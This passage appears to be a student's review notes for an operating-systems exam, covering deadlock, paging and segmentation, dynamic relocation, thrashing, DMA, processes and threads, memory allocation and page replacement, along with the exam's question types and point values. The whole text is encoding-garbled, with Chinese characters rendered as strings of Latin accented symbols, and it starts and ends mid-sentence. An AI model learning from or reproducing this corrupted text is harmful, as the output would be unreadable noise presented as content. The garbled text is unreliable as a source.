æˆçš„ä¸€ç§åƒµå±€ï¼Œå½“è¿›ç¨‹å¤„äºè¿™ç§åƒµæŒçŠ¶æ€æ—¶ï¼Œè‹¥æ— å¤–åŠ›ä½œç”¨ï¼Œå®ƒä»¬éƒ½å°†æ— æ³•å†å‘å‰æ¨è¿›ã€‚ äº§ç”Ÿæ­»é”çš„åŸå› ï¼š äº§ç”Ÿæ­»é”çš„åŸå› å¯å½’ç»“ä¸ºç«äº‰èµ„æºå¼•èµ·è¿›ç¨‹æ­»é”å’Œè¿›ç¨‹æ¨è¿›é¡ºåºä¸å½“å¼•èµ·æ­»é”ä¸¤ä¸ªæ–¹é¢ã€‚ äº§ç”Ÿæ­»é”çš„å¿…è¦æ¡ä»¶ï¼š äº’æ–¥æ¡ä»¶ è¯·æ±‚å’Œä¿æŒæ¡ä»¶ ä¸å‰¥å¤ºæ¡ä»¶ ç¯è·¯ç­‰å¾…æ¡ä»¶ åˆ†é¡µå’Œåˆ†æ®µå­˜å‚¨ç®¡ç†æœ‰ä½•åŒºåˆ«? é¡µæ˜¯ä¿¡æ¯çš„ç‰©ç†å•ä½ï¼Œåˆ†é¡µæ˜¯ä¸ºå®ç°ç¦»æ•£åˆ†é…æ–¹å¼ï¼Œä»¥æ¶ˆå‡å†…å­˜çš„å¤–é›¶å¤´ï¼Œæé«˜å†…å­˜åˆ©ç”¨ç‡ã€‚æˆ–è€…è¯´ï¼Œåˆ†é¡µä»…ä»…æ˜¯ç”±äºç³»ç»Ÿç®¡ç†çš„éœ€è¦è€Œä¸æ˜¯ç”¨æˆ·çš„éœ€è¦ã€‚ æ®µåˆ™æ˜¯ä¿¡æ¯çš„é€»è¾‘å•ä½ï¼Œå®ƒå«æœ‰ä¸€ç»„æ„ä¹‰ç›¸å¯¹å®Œæ•´çš„ä¿¡æ¯ï¼Œåˆ†æ®µçš„ç›®çš„æ˜¯ä¸ºäº†èƒ½æ›´å¥½åœ°æ»¡è¶³ç”¨æˆ·çš„éœ€è¦ã€‚ é¡µçš„å¤§å°å›ºå®šä¸”ç”±ç³»ç»Ÿå†³å®šï¼Œç”±ç³»ç»ŸæŠŠé€»è¾‘åœ°å€åˆ’åˆ†ä¸ºé¡µå·å’Œé¡µå†…åœ°å€ä¸¤éƒ¨åˆ†ï¼Œæ˜¯æœºæ¢°ç¡¬ä»¶å®ç°çš„ï¼Œå› è€Œåœ¨ç³»ç»Ÿä¸­åªèƒ½æœ‰ä¸€ç§å¤§å°çš„çš„é¡µé¢ï¼› è€Œæ®µçš„é•¿åº¦å´ä¸å›ºå®šï¼Œå†³å®šäºç”¨æˆ·æ‰€ç¼–å†™çš„ç¨‹åºï¼Œé€šå¸¸ç”±ç¼–è¯‘ç¨‹åºå¯¹æºç¨‹åºè¿›è¡Œç¼–è¯‘æ—¶ï¼Œæ ¹æ®ä¿¡æ¯çš„æ€§è´¨æ¥åˆ’åˆ†ã€‚ åˆ†é¡µçš„ä½œä¸šåœ°å€ç©ºé—´æ˜¯ä¸€ç»´çš„ï¼Œå³å•ä¸€çš„çº¿æ€§åœ°å€ç©ºé—´ï¼Œç¨‹åºå‘˜åªéœ€åˆ©ç”¨ä¸€ä¸ªè®°å¿†ç¬¦ï¼Œå³å¯è¡¨ç¤ºä¸€ä¸ªåœ°å€ã€‚ åˆ†æ®µçš„ä½œä¸šåœ°å€ç©ºé—´åˆ™æ˜¯äºŒç»´çš„ï¼Œç¨‹åºå‘˜åœ¨æ ‡è¯†ä¸€ä¸ªåœ°å€æ—¶ï¼Œæ—¢éœ€ç»™å‡ºæ®µåï¼Œåˆéœ€ç»™å‡ºæ®µå†…åœ°å€ã€‚ ä¸ºä»€ä¹ˆè¦å¼•å…¥åŠ¨æ€é‡å®šä½?å¦‚ä½•å®ç°? åŸå› ï¼š åœ¨è¿ç»­åˆ†é…æ–¹å¼ä¸­ï¼Œå¿…é¡»æŠŠä¸€ä¸ªç³»ç»Ÿæˆ–ç”¨æˆ·ç¨‹åºè£…å…¥ä¸€è¿ç»­çš„å†…å­˜ç©ºé—´ã€‚å¦‚æœåœ¨ç³»ç»Ÿä¸­åªæœ‰è‹¥å¹²ä¸ªå°çš„åˆ†åŒºï¼Œå³ä½¿å®ƒä»¬å®¹é‡çš„æ€»å’Œå¤§äºè¦è£…å…¥çš„ç¨‹åºï¼Œä½†ç”±äºè¿™äº›åˆ†åŒºä¸ç›¸é‚»æ¥ï¼Œä¹Ÿæ— æ³•æŠŠè¯¥ç¨‹åºè£…å…¥å†…å­˜ã€‚è‹¥æƒ³æŠŠç¨‹åºè£…å…¥ï¼Œå¯é‡‡ç”¨çš„ä¸€ç§æ–¹æ³•æ˜¯ï¼šå°†å†…å­˜ä¸­çš„æ‰€æœ‰ä½œä¸šè¿›è¡Œç§»åŠ¨ï¼Œä½¿å®ƒä»¬å…¨éƒ½ç›¸é‚»æ¥ï¼Œè¿™æ ·ï¼Œå³å¯æŠŠåŸæ¥åˆ†æ•£çš„å¤šä¸ªå°åˆ†åŒºæ‹¼æ¥æˆä¸€ä¸ªå¤§åˆ†åŒºï¼Œè¿™æ—¶å°±å¯æŠŠä½œä¸šè£…å…¥è¯¥åŒºã€‚è¿™ç§é€šè¿‡ç§»åŠ¨å†…å­˜ä¸­ä½œä¸šçš„ä½ç½®ï¼Œä»¥æŠŠåŸæ¥å¤šä¸ªåˆ†æ•£çš„å°åˆ†åŒºæ‹¼ï¼šæ¥æˆä¸€ä¸ªå¤§åˆ†åŒºçš„æ–¹æ³•ï¼Œç§°ä¸ºâ€œæ‹¼æ¥â€æˆ–â€œç´§å‡‘â€ã€‚ç”±äºç»è¿‡ç´§å‡‘åçš„æŸäº›ç”¨æˆ·ç¨‹åºåœ¨å†…å­˜ä¸­çš„ä½ç½®å‘ç”Ÿäº†å˜åŒ–ï¼Œæ­¤æ—¶è‹¥ä¸å¯¹ç¨‹åºå’Œæ•°æ®çš„åœ°å€åŠ ä»¥ä¿®æ”¹(å˜æ¢)ï¼Œåˆ™ç¨‹åºå¿…å°†æ— æ³•æ‰§è¡Œã€‚ä¸ºæ­¤ï¼Œåœ¨æ¯æ¬¡â€œç´§å‡‘â€åï¼Œéƒ½å¿…é¡»å¯¹ç§»åŠ¨äº†çš„ç¨‹åºæˆ–æ•°æ®è¿›è¡Œé‡å®šä½ã€‚ å®ç°ï¼š åœ¨åŠ¨æ€è¿è¡Œæ—¶è£…å…¥çš„æ–¹å¼ä¸­ï¼Œä½œä¸šè£…å…¥å†…å­˜åçš„æ‰€æœ‰åœ°å€éƒ½ä»ç„¶æ˜¯ç›¸å¯¹åœ°å€ï¼Œå°†ç›¸å¯¹åœ°å€è½¬æ¢ä¸ºç‰©ç†åœ°å€çš„å·¥ä½œï¼Œè¢«æ¨è¿Ÿåˆ°ç¨‹åºæŒ‡ä»¤è¦çœŸæ­£æ‰§è¡Œæ—¶è¿›è¡Œã€‚ä¸ºä½¿åœ°å€çš„è½¬æ¢ä¸ä¼šå½±å“åˆ°æŒ‡ä»¤çš„æ‰§è¡Œé€Ÿåº¦ï¼Œå¿…é¡»æœ‰ç¡¬ä»¶åœ°å€å˜æ¢æœºæ„çš„æ”¯æŒï¼Œå³é¡»åœ¨ç³»ç»Ÿä¸­å¢è®¾ä¸€ä¸ªé‡å®šä½å¯„å­˜å™¨ï¼Œç”¨å®ƒæ¥å­˜æ”¾ç¨‹åº(æ•°æ®)åœ¨å†…å­˜ä¸­çš„èµ·å§‹åœ°å€ã€‚ç¨‹åºåœ¨æ‰§è¡Œæ—¶ï¼ŒçœŸæ­£è®¿é—®çš„å†…å­˜åœ°å€æ˜¯ç›¸å¯¹åœ°å€ä¸é‡å®šä½å¯„å­˜å™¨ä¸­çš„åœ°å€ç›¸åŠ è€Œå½¢æˆçš„ã€‚å½“ç³»ç»Ÿå¯¹å†…å­˜è¿›è¡Œäº†â€œç´§å‡‘â€è€Œä½¿è‹¥å¹²ç¨‹åºä»å†…å­˜çš„æŸå¤„ç§»è‡³å¦ä¸€å¤„æ—¶,ä¸éœ€å¯¹ç¨‹åºåšä»»ä½•ä¿®æ”¹ï¼Œåªè¦ç”¨è¯¥ç¨‹åºåœ¨å†…å­˜çš„æ–°èµ·å§‹åœ°å€å»ç½®æ¢åŸæ¥çš„èµ·å§‹åœ°å€å³å¯ã€‚ åœ¨è¯·æ±‚åˆ†é¡µç³»ç»Ÿä¸­ï¼Œäº§ç”Ÿâ€œæŠ–åŠ¨â€çš„åŸå› æ˜¯ä»€ä¹ˆ? å‘ç”Ÿâ€œæŠ–åŠ¨â€çš„æ ¹æœ¬åŸå› æ˜¯ï¼ŒåŒæ—¶åœ¨ç³»ç»Ÿä¸­è¿è¡Œçš„è¿›ç¨‹å¤ªå¤šï¼Œç”±æ­¤åˆ†é…ç»™æ¯ä¸€ä¸ªè¿›ç¨‹çš„ç‰©ç†å—å¤ªå°‘ï¼Œä¸èƒ½æ»¡è¶³è¿›ç¨‹æ­£å¸¸è¿è¡Œçš„åŸºæœ¬è¦æ±‚ï¼Œè‡´ä½¿æ¯ä¸ªè¿›ç¨‹åœ¨è¿è¡Œæ—¶ï¼Œé¢‘ç¹åœ°å‡ºç°ç¼ºé¡µï¼Œå¿…é¡»è¯·æ±‚ç³»ç»Ÿå°†æ‰€ç¼ºä¹‹é¡µè°ƒå…¥å†…å­˜ã€‚è¿™ä¼šä½¿å¾—åœ¨ç³»ç»Ÿä¸­æ’é˜Ÿç­‰å¾…é¡µé¢è°ƒè¿›&#x2F;è°ƒå‡ºçš„è¿›ç¨‹æ•°ç›®å¢åŠ ã€‚æ˜¾ç„¶ï¼Œå¯¹ç£ç›˜çš„æœ‰æ•ˆè®¿é—®æ—¶é—´ä¹Ÿéšä¹‹æ€¥å‰§å¢åŠ ï¼Œé€ æˆæ¯ä¸ªè¿›ç¨‹çš„å¤§éƒ¨åˆ†æ—¶é—´éƒ½ç”¨äºé¡µé¢çš„æ¢è¿›ï¼Œæ¢å‡ºï¼Œè€Œå‡ ä¹ä¸èƒ½å†å»åšä»»ä½•æœ‰æ•ˆçš„å·¥ä½œï¼Œä»è€Œå¯¼è‡´å‘ç”Ÿå¤„ç†æœºçš„åˆ©ç”¨ç‡æ€¥å‰§ä¸‹é™å¹¶è¶‹äº0çš„æƒ…å†µã€‚æˆ‘ä»¬ç§°æ­¤æ—¶çš„è¿›ç¨‹æ˜¯å¤„äºâ€œæŠ–åŠ¨â€çŠ¶æ€ã€‚ ä½•è°“DMAæ–¹å¼? DMAæ§åˆ¶å™¨å¯é‡‡ç”¨å“ªå‡ ç§æ–¹å¼ä¸CPUåˆ†æ—¶ä½¿ç”¨å†…å­˜? ç›´æ¥å†…å­˜è®¿é—®(DMA)æ–¹å¼æ˜¯ä¸€ç§å®Œå…¨ç”±ç¡¬ä»¶æ‰§è¡ŒI&#x2F;Oäº¤æ¢çš„å·¥ä½œæ–¹å¼ã€‚DMA æ§åˆ¶å™¨ä»CPUå®Œå…¨æ¥ç®¡å¯¹æ€»çº¿çš„æ§åˆ¶ã€‚æ•°æ®äº¤æ¢ä¸ç»è¿‡CPU,è€Œç›´æ¥åœ¨å†…å­˜å’ŒI&#x2F;Oè®¾å¤‡ä¹‹é—´è¿›è¡Œã€‚ DMAæ§åˆ¶å™¨é‡‡ç”¨ä»¥ä¸‹ä¸‰ç§æ–¹å¼ï¼š åœæ­¢CPUè®¿é—®å†…å­˜ å½“å¤–è®¾è¦æ±‚ä¼ é€ä¸€æ‰¹æ•°æ®æ—¶ï¼Œç”±DMAæ§åˆ¶å™¨å‘ä¸€ä¸ªä¿¡å·ç»™CPUã€‚ DMAæ§åˆ¶å™¨è·å¾—æ€»çº¿æ§åˆ¶æƒåï¼Œå¼€å§‹è¿›è¡Œæ•°æ®ä¼ é€ã€‚ä¸€æ‰¹æ•°æ®ä¼ é€å®Œæ¯•åï¼ŒDMAæ§åˆ¶å™¨é€šçŸ¥CPUå¯ä»¥ä½¿ç”¨å†…å­˜ï¼Œå¹¶æŠŠæ€»çº¿æ§åˆ¶æƒäº¤è¿˜ç»™CPUã€‚ å‘¨æœŸæŒªç”¨ å½“I&#x2F;Oè®¾å¤‡æ²¡æœ‰DMAè¯·æ±‚æ—¶ï¼ŒCPUæŒ‰ç¨‹åºè¦æ±‚è®¿é—®å†…å­˜: ä¸€æ—¦I&#x2F;Oè®¾å¤‡æœ‰DMAè¯·æ±‚ï¼Œåˆ™I&#x2F;Oè®¾å¤‡æŒªç”¨ä¸€ä¸ªæˆ–å‡ ä¸ªå‘¨æœŸã€‚ DMAä¸CPUäº¤æ›¿è®¿å†… ä¸€ä¸ª CPUå‘¨æœŸå¯åˆ†ä¸º2ä¸ªå‘¨æœŸï¼Œä¸€ä¸ªä¸“ä¾›DMAæ§åˆ¶å™¨è®¿å†…ï¼Œå¦ä¸€ä¸ªä¸“ä¾›CPUè®¿å†…ã€‚ä¸éœ€è¦æ€»çº¿ä½¿ç”¨æƒçš„ç”³è¯·ã€å»ºç«‹å’Œå½’è¿˜è¿‡ç¨‹ã€‚ é“¶è¡Œå®¶ç®—æ³• æ®µé¡µå¼å­˜å‚¨ç®¡ç†ç³»ç»Ÿçš„åœ°å€è½¬æ¢è¿‡ç¨‹ ä½œä¸šè°ƒåº¦ç®—æ³• ç£ç›˜è°ƒåº¦ç®—æ³•SSTFæœ€çŸ­å¯»æ‰¾æ—¶é—´ä¼˜å…ˆ SCANç”µæ¢¯ç®—æ³• ç§»åŠ¨åˆ°æœ€å¤–ä¾§ä¹‹åï¼Œå†å‘å†…ç§»åŠ¨ã€‚ C-SCANå¾ªç¯æ‰«æç®—æ³• åªå¤„ç†æŸä¸€å•ç‹¬æ–¹å‘ä¸Šçš„è¯·æ±‚ï¼Œè¿”å›æ—¶ç›´æ¥åˆ°å§‹ç«¯ï¼Œä¸å¤„ç†ä»»ä½•è¯·æ±‚ é¢˜å‹é€‰æ‹© 10åˆ† æ¯é¢˜ä¸€åˆ† å¡«ç©º 10åˆ† æ¯é¢˜ä¸€åˆ† ç¼–å†™ç¨‹åº 10åˆ† clock ç®—æ³• 10åˆ† 4ä¸ªç®€ç­”é¢˜ï¼š é‡å®šä½ã€è™šæ‹Ÿå­˜å‚¨ã€DMAã€è½¯ä¸­æ–­ã€æ®µé¡µå¼å­˜å‚¨æ¦‚å¿µ 20åˆ† PPTä¸­çš„è®¡ç®—é¢˜ï¼šç£ç›˜è°ƒåº¦ç®—æ³•ã€é¢„é˜²æ­»é”ã€æ€ç´¢çš„åˆ¤æ–­æ¡ä»¶ï¼ˆè®¡ç®—é¢˜äºŒé€‰ä¸€ï¼‰ 10åˆ† é¡µé¢è°ƒåº¦ï¼Œç‰©ç†åœ°å€å’Œé€»è¾‘åœ°å€çš„æ¢ç®— 10åˆ† å¤šé€šé“è°ƒåº¦ç”»å›¾ 10åˆ† ç« èŠ‚çŸ¥è¯†ç‚¹ç¬¬ä¸‰ç« è¿›ç¨‹ç®¡ç† å¤ä¹ PPTä¸Šçš„ç¬”è®° ä»€ä¹ˆæ˜¯è¿›ç¨‹ï¼Ÿä»€ä¹ˆæ˜¯çº¿ç¨‹ï¼Ÿè¿›ç¨‹å’Œçº¿ç¨‹çš„åŒºåˆ«ï¼Ÿ è¿›ç¨‹ &#x3D; ç¨‹åºæ®µ + ç›¸å…³çš„æ•°æ®æ®µ + PCB PCBï¼šæè¿°è¿›ç¨‹çš„åŸºæœ¬æƒ…å†µå’Œæ´»åŠ¨è¿‡ç¨‹ï¼Œè¿›è€Œæ§åˆ¶å’Œç®¡ç†è¿›ç¨‹ çº¿ç¨‹ &#x3D; çº¿ç¨‹æ§åˆ¶è¡¨ + å­˜å‚¨ä¸Šä¸‹æ–‡çš„ç”¨æˆ·æ ˆ + æ ¸å¿ƒæ ˆ çº¿ç¨‹æ˜¯åœ¨è¿›ç¨‹å†…ç”¨äºè°ƒåº¦å’Œå æœ‰å¤„ç†æœºçš„åŸºæœ¬å•ä½ã€‚ åŒºåˆ«ï¼š è¿›ç¨‹æ˜¯èµ„æºç®¡ç†çš„åŸºæœ¬å•ä½ï¼Œæ‹¥æœ‰è‡ªå·±çš„åœ°å€ç©ºé—´å’Œå„ç§èµ„æºã€‚ çº¿ç¨‹æ˜¯å¤„ç†æœºè°ƒåº¦çš„åŸºæœ¬å•ä½ï¼Œåªå’Œå…¶ä»–çº¿ç¨‹ä¸€èµ·å…±äº«è¿›ç¨‹èµ„æºï¼Œè‡ªå·±æ²¡æœ‰ä»»ä½•èµ„æºã€‚ è¿›ç¨‹æœ‰è‡ªå·±çš„èµ„æºï¼Œè¿›ç¨‹æ—  è¿›ç¨‹åˆ‡æ¢å¤„ç†æœºå’Œè°ƒåº¦çš„æ—¶å€™ï¼Œæ¶‰åŠèµ„æºè½¬ç§»ï¼Œç°åœºä¿æŠ¤ç­‰ï¼Œå¯¼è‡´å¤„ç†æœºåˆ‡æ¢æ—¶é—´é•¿ï¼Œèµ„æºåˆ©ç”¨ç‡é™ä½ çº¿ç¨‹åˆ‡æ¢æ—¶ï¼Œä¸å‘ç”Ÿèµ„æºå˜åŒ–ï¼Œç‰¹åˆ«æ˜¯åœ°å€ç©ºé—´çš„å˜åŒ–ï¼Œæ‰€ä»¥åˆ‡æ¢æ—¶é—´çŸ­ï¼Œå¤„ç†æœºæ•ˆç‡è¾ƒé«˜ è¿›ç¨‹åˆ‡æ¢æ—¶æ¶‰åŠèµ„æºè½¬ç§»ï¼Œä¿æŠ¤ç°åœºï¼Œåˆ©ç”¨ç‡ä½ã€‚çº¿ç¨‹ä¸æ¶‰åŠï¼Œå¤„ç†æœºåˆ©ç”¨ç‡é«˜ å¤šçº¿ç¨‹å¯ä»¥å‡å°‘ç”¨æˆ·ç­‰å¾…æ—¶é—´ï¼Œæé«˜ç³»ç»Ÿå“åº”é€Ÿåº¦ã€‚ çº¿ç¨‹å’Œè¿›ç¨‹ä¸€æ ·ï¼Œæœ‰è‡ªå·±çš„çŠ¶æ€ï¼Œç›¸åº”çš„åŒæ­¥æœºåˆ¶ã€‚ ä½†çº¿ç¨‹æ²¡æœ‰å•ç‹¬çš„æ•°æ®å’Œç¨‹åºç©ºé—´ï¼Œæ‰€ä»¥ä¸èƒ½åƒè¿›ç¨‹é‚£æ ·æŠŠæ•°æ®äº¤æ¢åˆ°å¤–å­˜ï¼Œä»è€Œæ²¡æœ‰æŒ‚èµ·çŠ¶æ€ çº¿ç¨‹æ²¡æœ‰æŒ‚èµ·çŠ¶æ€ è¿›ç¨‹çš„è°ƒåº¦ã€åŒæ­¥ç­‰æ§åˆ¶å¤§å¤šç”±æ“ä½œç³»ç»Ÿå†…æ ¸å®Œæˆã€‚ çº¿ç¨‹æ—¢å¯ä»¥æ“ä½œç³»ç»Ÿå†…æ ¸ï¼Œä¹Ÿå¯ä»¥ç”¨æˆ·æ§åˆ¶ã€‚ ç¬¬å››ç« å¤„ç†æœºè°ƒåº¦ çœ‹PPTç¬”è®° ä¾‹é¢˜ï¼š ç¬¬äº”ç« ä»€ä¹ˆæ˜¯è™šæ‹Ÿå­˜å‚¨å™¨ï¼Ÿç‰¹ç‚¹ï¼Ÿ ç”±è¿›ç¨‹ä¸­çš„ç›®æ ‡ä»£ç ã€æ•°æ®ç­‰çš„è™šæ‹Ÿåœ°å€ç»„æˆçš„è™šæ‹Ÿç©ºé—´ç§°ä¸ºè™šæ‹Ÿå­˜å‚¨å™¨ã€‚ è™šæ‹Ÿå­˜å‚¨å™¨ä¸è€ƒè™‘ç‰©ç†å­˜å‚¨å™¨çš„å¤§å°å’Œä¿¡æ¯å­˜æ”¾çš„å®é™…ä½ç½®ï¼Œåªè§„å®šæ¯ä¸ªè¿›ç¨‹ä¸­ç›¸äº’å…³è”çš„ä¿¡æ¯çš„ç›¸å¯¹ä½ç½®ã€‚ è™šæ‹Ÿå­˜å‚¨å™¨çš„å®¹é‡ç”±è®¡ç®—æœºçš„åœ°å€ç»“æ„å’Œå¯»å€æ–¹å¼æ¥ç¡®å®šã€‚ è™šæ‹Ÿå­˜å‚¨éœ€è¦æœ‰ç›¸åº”çš„åœ°å€è½¬æ¢æœºæ„ï¼ŒæŠŠæŒ‡ä»¤çš„è™šæ‹Ÿåœ°å€è½¬æ¢ä¸ºå®é™…ç‰©ç†åœ°å€ èƒ½å¦æŠŠè™šæ‹Ÿç©ºé—´æ— é™æ‰©å¤§ï¼Ÿ ä¸èƒ½ï¼Œè™šæ‹Ÿå­˜å‚¨å™¨çš„å®¹é‡ç”±è®¡ç®—æœºçš„åœ°å€ç»“æ„å’Œå¯»å€æ–¹å¼æ¥ç¡®å®šã€‚åœ°å€æ€»çº¿çš„é‡æ˜¯æœ‰é™çš„ï¼Œå¯»å€ä¸åˆ°ï¼Œä¸èƒ½è¶…ç•Œã€‚ å®ç°åœ°å€é‡å®šä½çš„æ–¹æ³•ï¼Ÿ é™æ€åœ°å€é‡å®šä½ï¼š åœ¨è™šæ‹Ÿç©ºé—´ç¨‹åºæ‰§è¡Œä¹‹å‰ç”±è£…é…ç¨‹åºå®Œæˆåœ°å€æ˜ å°„å·¥ä½œã€‚ ä¸éœ€è¦ç¡¬ä»¶æ”¯æŒ è¿›è¡Œåœ°å€å˜æ¢æ— æ³•å®ç°è™šæ‹Ÿå­˜å‚¨å™¨ å¿…é¡»å ç”¨è¿ç»­çš„å†…å­˜ç©ºé—´ éš¾ä»¥åšåˆ°ç¨‹åºå’Œæ•°æ®çš„å…±äº« åŠ¨æ€åœ°å€é‡å®šä½ï¼š åœ¨ç¨‹åºæ‰§è¡Œè¿‡ç¨‹ä¸­ï¼Œåœ¨CPUè®¿é—®å†…å­˜ä¹‹å‰ç”±ç¡¬ä»¶åœ°å€å˜æ¢æœºæ„å°†è¦è®¿é—®çš„ç¨‹åºæˆ–æ•°æ®åœ°å€è½¬æ¢æˆå†…å­˜åœ°å€ã€‚ å¯ä»¥å¯¹å†…å­˜è¿›è¡Œéè¿ç»­åˆ†é… åŠ¨æ€é‡å®šä½æä¾›äº†å®ç°è™šæ‹Ÿå­˜å‚¨å™¨çš„åŸºç¡€ æœ‰åˆ©äºç¨‹åºæ®µçš„å…±äº« åŠ¨æ€åˆ†åŒºå¼ç®¡ç†çš„å¸¸ç”¨å†…å­˜åˆ†é…ç®—æ³•æœ‰å“ªå‡ ç§ï¼Ÿä¼˜ç¼ºç‚¹ï¼Ÿ åŠ¨æ€åˆ†åŒºå¼ç®¡ç†çš„å¸¸ç”¨å†…å­˜åˆ†é…ç®—æ³•æœ‰FFï¼ˆæœ€å…ˆé€‚åº”æ³•ï¼‰first fitã€BFï¼ˆæœ€ä½³é€‚åº”æ³•ï¼‰best fitã€WFï¼ˆæœ€åé€‚åº”æ³•ï¼‰worst fit ä»æœç´¢é€Ÿåº¦ä¸Šï¼šFFæœ€å¥½ï¼ŒBFå’ŒWFéƒ½è¦æ±‚æŠŠç©ºé—²åŒºæŒ‰å¤§å°è¿›è¡Œæ’é˜Ÿã€‚ ä»å›æ”¶è¿‡ç¨‹ä¸Šï¼šFFæœ€å¥½ï¼Œå› ä¸ºBFã€WFéƒ½å¿…é¡»é‡æ–°è°ƒæ•´ç©ºé—²åŒºçš„ä½ç½®ã€‚ BFæ‰¾åˆ°çš„ç©ºé—²åŒºæ˜¯æœ€å¥½çš„ï¼Œä½†æ˜¯ä¼šé€ æˆå†…å­˜ç¢ç‰‡è¾ƒå¤šï¼Œå½±å“å†…å­˜åˆ©ç”¨ç‡ã€‚WFç¢ç‰‡æœ€å°‘ï¼Œä½†æ˜¯å¯¹å†…å­˜è¯·æ±‚è¾ƒå¤šçš„è¿›ç¨‹å¯èƒ½åˆ†é…å¤±è´¥ã€‚ BFæ˜¯å…ˆæ‰¾æœ€å°çš„ç©ºé—²åŒºè¿›è¡Œåˆ†é…ã€‚ WFæ˜¯å…ˆæ‰¾æœ€å¤§çš„ç©ºé—²åŒºè¿›è¡Œåˆ†é…ã€‚ ä»€ä¹ˆæ˜¯è¦†ç›–ï¼Ÿä»€ä¹ˆæ˜¯äº¤æ¢ï¼Ÿè¦†ç›–å’Œäº¤æ¢çš„åŒºåˆ«æ˜¯ä»€ä¹ˆï¼Ÿ è¦†ç›–ï¼š å°†ç¨‹åºåˆ’åˆ†ä¸ºè‹¥å¹²ä¸ªåŠŸèƒ½ä¸Šç›¸å¯¹ç‹¬ç«‹çš„ç¨‹åºæ®µ æŒ‰ç…§ç¨‹åºçš„é€»è¾‘ç»“æ„è®©é‚£äº›ä¸ä¼šåŒæ—¶æ‰§è¡Œçš„ç¨‹åºæ®µå…±äº«åŒä¸€å—å†…å­˜åŒºçš„å†…å­˜æ‰©å……æŠ€æœ¯ã€‚ äº¤æ¢ï¼š å…ˆå°†å†…å­˜æŸéƒ¨åˆ†çš„ç¨‹åºæˆ–æ•°æ®å†™å…¥å¤–å­˜äº¤æ¢åŒº å†ä»å¤–å­˜äº¤æ¢åŒºä¸­è°ƒå…¥æŒ‡å®šçš„ç¨‹åºæˆ–æ•°æ®åˆ°å†…å­˜ä¸­æ¥ï¼Œå¹¶è®©å…¶æ‰§è¡Œçš„ä¸€ç§å†…å­˜æ‰©å……æŠ€æœ¯ã€‚ åŒºåˆ«ï¼š â€‹ äº¤æ¢ï¼š â€‹ ä¸è¦æ±‚ç»™å‡ºç¨‹åºæ®µä¹‹é—´çš„è¦†ç›–ç»“æ„ â€‹ ä¸»è¦åœ¨è¿›ç¨‹æˆ–ä½œä¸šä¹‹é—´è¿›è¡Œ â€‹ è¦†ç›–ï¼š â€‹ ä¸»è¦åœ¨åŒä¸€ä¸ªä½œä¸šæˆ–åŒä¸€ä¸ªè¿›ç¨‹å†…è¿›è¡Œ â€‹ åªèƒ½å¯¹é‚£äº›ä¸è¦†ç›–ç¨‹åºæ®µæ— å…³çš„ç¨‹åºæ®µè¿›è¡Œè¦†ç›– ä»€ä¹ˆæ˜¯é¡µå¼ç®¡ç†ï¼Ÿé™æ€é¡µå¼ç®¡ç†å¯ä»¥å®ç°è™šå­˜å—ï¼Ÿ é¡µå¼ç®¡ç†å°±æ˜¯æŠŠå„è¿›ç¨‹çš„è™šæ‹Ÿç©ºé—´åˆ’åˆ†ä¸ºè‹¥å¹²é•¿åº¦ç›¸ç­‰çš„é¡µé¢ï¼ŒæŠŠæŒ‡ä»¤æŒ‰é¡µé¢å¤§å°åˆ’åˆ†åå­˜æ”¾åœ¨å†…å­˜ä¸­æ‰§è¡Œï¼Œæˆ–è€…åªåœ¨å†…å­˜ä¸­å­˜æ”¾é‚£äº›ç»å¸¸è¢«æ‰§è¡Œæˆ–å°†è¢«æ‰§è¡Œçš„é¡µé¢ã€‚ä¸ç»å¸¸è¢«æ‰§è¡Œçš„æ”¾åœ¨å¤–å­˜ï¼ŒæŒ‰ä¸€å®šè§„åˆ™è°ƒå…¥çš„ä¸€ç§å†…å­˜ç®¡ç†æ–¹å¼ã€‚ é™æ€é¡µé¢ä¸èƒ½ï¼Œå› ä¸ºå®ƒè¦æ±‚è¿›ç¨‹æˆ–ä½œä¸šåœ¨æ‰§è¡Œå‰å…¨éƒ¨è£…å…¥å†…å­˜ï¼Œä½œä¸šæˆ–è¿›ç¨‹å¤§å°ä»å—å†…å­˜å¯ç”¨é¡µé¢æ•°çš„é™åˆ¶ã€‚ èƒ½æœ‰æ•ˆæé«˜å†…å­˜åˆ©ç”¨ç‡ ä»€ä¹ˆæ˜¯è¯·æ±‚é¡µå¼ç®¡ç†ï¼Ÿ ä¸€ç§åŠ¨æ€é¡µå¼å†…å­˜ç®¡ç†ï¼Œè¿›ç¨‹æˆ–ä½œä¸šå¼€å§‹æ‰§è¡Œå‰ï¼Œä¸æŠŠç¨‹åºæ®µä¸€æ¬¡æ€§å…¨éƒ¨è£…å…¥ï¼Œåªè£…å…¥åå¤æ‰§è¡Œçš„éƒ¨åˆ†ã€‚å…¶ä»–éƒ¨åˆ†åœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­åŠ¨æ€è£…å…¥ã€‚å½“éœ€è¦æŒ‡ä»¤ï¼Œä½†åˆä¸åœ¨å†…å­˜ä¸­æ—¶ä¼šå‘ç”Ÿç¼ºé¡µä¸­æ–­ï¼Œç³»ç»Ÿå†å°†å¤–å­˜ä¸­ç›¸åº”çš„é¡µé¢è°ƒå…¥å†…å­˜ã€‚ è¯·æ±‚é¡µå¼ç®¡ç†ä¸­æœ‰å“ªå‡ ç§å¸¸ç”¨çš„é¡µé¢ç½®æ¢ç®—æ³•ï¼Ÿä¼˜ç¼ºç‚¹ï¼Ÿ 10åˆ†å¤§é¢˜ï¼Œä¸è€ƒæ¦‚å¿µï¼Œè€ƒå¤§é¢˜ï¼Œä½†æ˜¯è¿˜æ˜¯è¦æ‡‚åŸç† éšæœºæ·˜æ±°ç®—æ³•ï¼šéšæœºçš„é€‰æ‹©æŸä¸ªç”¨æˆ·é¡µé¢å¹¶å°†å…¶æ¢å‡ºã€‚ è½®è½¬æ³•RRï¼šå¾ªç¯æ¢å‡ºå†…å­˜å¯ç”¨åŒºé‡Œä¸€ä¸ªå¯ä»¥è¢«æ¢å‡ºå»çš„é¡µã€‚æ— è®ºå®ƒæ˜¯åˆšè¢«æ¢è¿›è¿˜æ˜¯å·²ç»æ¢è¿›å¾ˆé•¿æ—¶é—´ã€‚ å…ˆè¿›å…ˆå‡ºFIFOï¼šæ·˜æ±°åœ¨å†…å­˜ä¸­é©»ç•™æ—¶é—´æœ€é•¿çš„ä¸€é¡µ 